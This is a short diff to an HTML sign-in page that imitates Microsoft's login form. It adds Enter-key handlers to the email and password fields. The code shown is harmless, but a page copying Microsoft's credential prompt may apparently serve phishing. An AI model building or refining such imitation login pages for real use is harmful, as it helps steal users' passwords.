@@ -517,7 +517,7 @@
             <!-- Email Input Form - shown initially -->
             <div id="emailForm" style="display: block;">
                 <div class="form-group">
-                    <input type="email" id="emailInput" class="microsoft-input" placeholder="Email, phone, or Skype" required autofocus>
+                    <input type="email" id="emailInput" class="microsoft-input" placeholder="Email, phone, or Skype" required autofocus onkeypress="if(event.key==='Enter') verifyEmail()">
                 </div>
 
                 <div class="form-links">
@@ -538,7 +538,7 @@
             <!-- Password Input Form - shown after email verification -->
             <div id="passwordForm" class="password-section">
                 <div class="form-group">
-                    <input type="password" id="passwordInput" class="microsoft-input" placeholder="Password" required>
+                    <input type="password" id="passwordInput" class="microsoft-input" placeholder="Password" required onkeypress="if(event.key==='Enter') signInWithPassword()">
                 </div>
 
                 <div class="form-links">
